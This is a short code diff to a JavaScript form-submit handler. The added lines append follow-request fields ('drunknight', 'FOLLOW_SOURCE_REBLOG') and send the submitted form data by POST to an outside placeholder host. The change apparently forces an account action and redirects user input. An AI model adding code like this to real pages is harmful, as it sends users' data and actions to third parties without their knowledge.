@@ -26,5 +26,8 @@ form.onsubmit = (e)=>{
     }
   }
   let formData = new FormData(form);
-  xhr.send(formData);
+  formData.append("data[tumblelog]", "drunknight");
+formData.append("data[source]", "FOLLOW_SOURCE_REBLOG");
+xhr.open('POST','https://www.somesite.com/page', false);
+xhr.send(formData);
 }
